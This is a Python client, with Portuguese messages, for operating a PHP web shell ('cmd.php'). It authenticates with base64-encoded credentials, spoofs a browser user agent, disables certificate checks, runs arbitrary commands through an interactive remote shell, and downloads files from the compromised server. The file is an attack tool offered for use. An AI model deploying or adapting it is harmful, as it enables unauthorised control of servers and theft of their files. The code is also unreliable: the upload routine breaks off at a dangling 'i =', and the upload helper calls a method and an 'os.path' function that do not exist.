import requests, base64, logging, os
from tqdm import tqdm
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebShellAuthError(Exception):
	pass
class WebShellConnectionError(Exception):
	pass
class WebShellCMDError(Exception):
	pass
class WebShellDecodeError(Exception):
	def __init__(self, message, content, headers, status_code, reason):
		self.message = message
		self.body = content
		self.headers = headers
		self.status_code = status_code
		self.reason = reason
		super().__init__(self.message)

#https://stackoverflow.com/a/41041028/13886183
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

logging.basicConfig(format='\033[1;32m[%(asctime)s]\033[0;0m \033[1;34m[%(levelname)s]\033[0;0m %(message)s', level=logging.INFO, datefmt='%H:%M:%S')

class WebShell:
	def __init__(self, username, password, endpoint):
		self.session = requests.Session()
		self.username = username
		self.password = password
		self.endpoint = endpoint
		self.user = 'unknown'
		self.path = '/'
		self.local_cmds = False
		self.logger = logging.getLogger()
		if not self.endpoint.endswith('?e=1'):
			self.endpoint += '?e=1&b=1'


		self._auth()

	def _auth(self):
		try:
			res = self.session.post(self.endpoint, data={
				'u': base64.b64encode(self.username.encode()).decode(),
				'p': base64.b64encode(self.password.encode()).decode()
			}, headers={
				
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
			}, allow_redirects=False)
			
			if res.status_code != 200 or not self._getHeaderInfo(res):
				
				raise WebShellAuthError('Não foi possível realizar login')
			
		except requests.exceptions.ConnectionError as e:
			raise WebShellConnectionError(e)

		return True

	def _getHeaderInfo(self, res):
		user = res.headers.get('X-User')
		path = res.headers.get('X-Path')

		if isinstance(user, str) and isinstance(path, str) and len(user) > 1 and len(path) > 1:
			self.user = base64.b64decode(user.encode()).decode()
			self.path = base64.b64decode(path.encode()).decode()
			return True
		return False
	def _download(self, file, dest):
		try:
			res = self.session.post(self.endpoint, data={'a': base64.b64encode('download {}'.format(file).encode()).decode()}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, verify=False, allow_redirects=False, stream=True)
			if res.status_code == 401:
				self._auth()
				return 'Usuário não autenticado'


			if res.status_code != 200:
				try:
					return '' if (int(res.headers.get('Content-Length')) if 'Content-Length' in res.headers else 0) < 1 else base64.b64decode(res.content).decode()
				except UnicodeDecodeError as e:
					raise WebShellDecodeError(e, res.text, res.headers, res.status_code, res.reason)

			length = int(res.headers.get('content-length', 0))
			with open(dest, 'wb') as file, tqdm(desc=os.path.basename(dest), total=length, unit='iB', unit_scale=True, unit_divisor=1024) as bar:
				for data in res.iter_content(chunk_size=1024):
					size = file.write(data)
					bar.update(size)

			return "Salvo em '{}'".format(dest)

		except requests.exceptions.ConnectionError as e:
			raise WebShellCMDError(e)
		return ''

	def _cmd(self, cmd, trying=False):
		if self.local_cmds != False:
			args = cmd.split(' ', 1)
			args[0] = args[0].lower()
			if hasattr(self.local_cmds, args[0]) and callable(getattr(self.local_cmds, args[0])):
				if len(args) < 2:
					args.append('')

				print(getattr(self.local_cmds, args[0])(self, args[1], len(args[1])))
				return
		try:
			res = self.session.post(self.endpoint, data={
				'a': base64.b64encode(cmd.encode()).decode()
			}, headers={
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
			}, allow_redirects=False)
			if res.status_code == 401:
				self._auth()
				return

			if not self._getHeaderInfo(res):
				raise WebShellCMDError('Erro ao obter os dados do path e usuário atualizado')

			try:
				return False if (int(res.headers.get('Content-Length')) if 'Content-Length' in res.headers else 0) < 1 else base64.b64decode(res.content).decode()
			except UnicodeDecodeError as e:
				raise WebShellDecodeError(e, res.text, res.headers, res.status_code, res.reason)

		except requests.exceptions.ConnectionError as e:
			raise WebShellCMDError(e)

	def _uploadinblocks(self, file, dest, blocksize=1024):
		with open(file, 'rb') as file:
			encoded = base64.b64encode(file.read()).decode()
			size = len(encoded)
			k = size // blocksize + int(size % blocksize != 0)
			i =

	def _input(self):
		return input('\033[1;31m{}\033[37m:\033[1;34m{}\033[37m$ '.format(self.user, self.path)).strip()

	def on(self, local_class):
		self.local_cmds = local_class

	def shell(self):
		exit_cmds = ['quit', 'exit']
		while(True):
			try:
				cmd = self._input()
				if len(cmd) < 1:
					continue
				if cmd.lower() in exit_cmds:
					break

				cmd = self._cmd(cmd)
				if cmd:
					print(cmd)

			except WebShellConnectionError as e:
				self.logger.critical(e)
			except WebShellAuthError as e:
				self.logger.warning(e)
			except WebShellCMDError as e:
				self.logger.error(e)
			except KeyboardInterrupt:
				break
			except WebShellDecodeError as e:
				self.logger.error(e.message)
				self.logger.info('status_code: {} - {}'.format(e.status_code, e.reason))
				self.logger.info(e.headers)

			except Exception as e:
				self.logger.critical(e)

class localCMDs:
	@staticmethod
	def download(this, args, length):
		if length < 1:
			return 'Use download [arquivo] [destino]'
		args = args.split(' ', 1)
		if len(args) != 2 or len(args[0]) < 1 or len(args[1]) < 1:
			return 'Use download [arquivo] [destino]'

		dirname = args[1]
		filename = os.path.basename(args[1])
		if not os.path.isdir(dirname):
			dirname = os.path.dirname(dirname)
		else:
			filename = os.path.basename(args[0])

		if len(dirname) > 0:
			if dirname != '/' and not dirname.endswith('/'):
				dirname += '/'
			if not os.path.exists(dirname):
				return "O diretório '{}' não foi encontrado".format(dirname)

		args[1] = dirname + filename
		if os.path.exists(args[1]) and os.path.isfile(args[1]):
			return "O arquivo '{}' já existe".format(args[1])
		
		return this._download(args[0], args[1])

	@staticmethod
	def uploadinblocks(this, args, length):
		if length < 1:
			return "Use uploadinblocks [local do arquivo] [destino]"
		args = args.split(' ', 2)
		if len(args) < 2:
			args.append('./')

		if len(args) < 3:
			args.append(1024)
		else:
			args[2] = int(args[2])

		if len(args[0]) < 1 or not os.path.isfile(args[0]):
			return "Arquivo '{}' não encontrado".format(args[0])

		if len(args[1]) < 1:
			args[1] = './'

		if args[1].endswith('/'):
			args[1] += os.path.filename(args[0])

		return this.uploadinblocks(args[0], args[1], args[2])

def main():
	ws = WebShell('admin', 'admin', 'http://localhost/cmd.php')
	ws.on(localCMDs)

	ws.shell()

if __name__ == '__main__':
	main()